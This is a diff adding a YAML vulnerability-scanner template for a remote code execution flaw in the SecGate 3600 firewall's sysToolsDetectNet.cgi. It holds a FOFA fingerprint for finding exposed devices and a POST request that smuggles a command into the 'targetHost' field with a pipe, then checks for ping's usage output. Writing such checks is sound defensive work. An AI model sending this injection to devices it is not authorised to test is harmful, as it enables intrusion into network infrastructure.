@@ -1,0 +1,23 @@
+id: poc-yaml-secgate-3600-systoolsdetectnet-cgi-rce
+info:
+  name: 网神SecGate 3600防火墙 sysToolsDetectNet.cgi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 网神SecGate3600
+  fofa: body="sec_gate_image/login_02.gif"
+requests:
+- method: POST
+  path: /cgi-bin/sysTools/sysToolsDetectNet.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: targetHost=|ping|
+  expression: 'status_code == 200 &&
+
+    contains(headers,`Usage: ping`) &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
